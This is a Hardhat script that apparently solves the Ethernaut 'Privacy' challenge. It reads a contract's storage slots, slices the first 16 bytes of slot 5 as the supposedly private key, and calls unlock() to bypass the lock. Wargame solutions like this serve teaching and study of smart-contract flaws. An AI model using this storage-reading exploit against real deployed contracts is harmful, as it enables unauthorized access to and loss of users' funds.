const { ethers } = require("hardhat")

async function main() {
  const [signer] = await ethers.getSigners()

  console.log('Manipulating state with wallet address:', signer.address)

  console.log('Account balance:', (await signer.getBalance()).toString())

  const instanceAddress = "0x0a2c5034913A4a5E52c207a742ba8A366060bAC4"
  console.log("Scraping storage:")
  const storage = [];
  for (let i=0; i<7; i++) {
    const currentStorage = await  ethers.provider.getStorageAt(instanceAddress, i);
    console.log("Storage #%s: %s", i, currentStorage);
    storage.push(currentStorage);
  }
  let passwordLong = storage[5];
  console.log("3rd item in private data array: %s (length: %s)" , passwordLong, (passwordLong.length- 2)/2);
  const password = ethers.utils.hexDataSlice(passwordLong, 0, 16);
  console.log("First 16 bytes: %s (length: %s)", password, (password.length- 2)/2);
  
  const PrivacyFactory = await ethers.getContractFactory("Privacy");
  const Privacy = PrivacyFactory.attach(instanceAddress);
  const tx = await Privacy.unlock(password, {gasLimit: ethers.utils.parseUnits('1', 'mwei')});
  await tx.wait();
  const locked = await Privacy.locked();
  if (!locked) {
    console.log("Successfully unlocked!")
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
